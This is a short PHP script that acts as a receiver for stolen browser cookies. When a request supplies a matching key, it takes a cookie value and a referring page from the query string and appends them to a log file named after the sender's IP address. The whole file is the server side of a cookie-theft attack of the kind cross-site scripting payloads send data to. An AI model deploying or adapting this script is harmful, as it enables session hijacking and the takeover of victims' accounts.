<?php
require("config.php");
if(isset($_GET['connect']) && $_GET['connect'] == $connectKey && isset($_GET['c']) && isset($_GET['referer'])) {
    $cookie=$_GET['c'];
    $referer=$_GET['referer'];
    $logfile="./logs/".$_SERVER['REMOTE_ADDR']." - cookie.txt";
    $fp = fopen($logfile, "a") or die("Unable to open file!");
    fwrite($fp, $cookie."\r\n^--- FROM ".$referer."\r\n") or die("Unable to write to file!");
    fflush($fp);
    fclose($fp);
}
?>
